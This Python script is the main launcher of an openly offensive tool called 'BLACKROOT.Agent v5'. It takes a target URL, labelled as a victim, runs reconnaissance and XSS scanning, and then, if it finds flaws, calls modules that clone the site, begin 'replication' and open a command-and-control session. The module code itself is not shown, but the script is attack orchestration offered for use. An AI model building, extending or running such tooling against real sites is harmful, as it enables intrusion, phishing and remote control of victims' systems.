import argparse
from recon.scanner import advanced_recon, scan_for_xss, smart_scan
from mimic.site_cloner import clone_site
from core.dashboard import start_dashboard
from core.replication import begin_replication
from core.commander import initiate_c2_session
import json

def main():
    banner = """
     ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ████████╗
    ██╔════╝ ██║     ██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
    ██║  ███╗██║     ███████║██║     █████╔╝ ██████╔╝██║   ██║██║   ██║   ██║   
    ██║   ██║██║     ██╔══██║██║     ██╔═██╗ ██╔═══╝ ██║   ██║██║   ██║   ██║   
    ╚██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║     ╚██████╔╝╚██████╔╝   ██║   
     ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝      ╚═════╝  ╚═════╝    ╚═╝   
             BLACKROOT.Agent v5 — Shadow Intelligence Swarm
    """
    print(banner)

    parser = argparse.ArgumentParser(description="BLACKROOT.Agent v5 - Swarm Mode Execution")
    parser.add_argument('--target', required=True, help='Target URL (e.g., https://victim.com)')
    parser.add_argument('--silent', action='store_true', help='Run cloner in silent mode')
    parser.add_argument('--config', default='config.json', help='Path to configuration file')
    args = parser.parse_args()

    print(f"[🕷️] Target Acquired: {args.target}")
    recon_report = advanced_recon(args.target)
    endpoints = recon_report.get('endpoints', [])
    print(f"[ℹ️] Recon found {len(endpoints)} endpoints.")
    xss_results = scan_for_xss(args.target, endpoints)

    any_vuln = any(xss_results[url] for url in xss_results)
    if any_vuln:
        print("[✔️] XSS vulnerabilities detected. Proceeding with exploitation modules...")
        clone_site(args.target, silent=args.silent)
        config = load_config(args.config)
        begin_replication(args.target, config)
        initiate_c2_session()
        start_dashboard()
    else:
        print("[⚠️] No injection vectors found. Expand scan or use external exploit toolkit.")

# Load configuration from a JSON file
def load_config(config_file):
    with open(config_file, 'r') as file:
        return json.load(file)

if __name__ == "__main__":
    main()
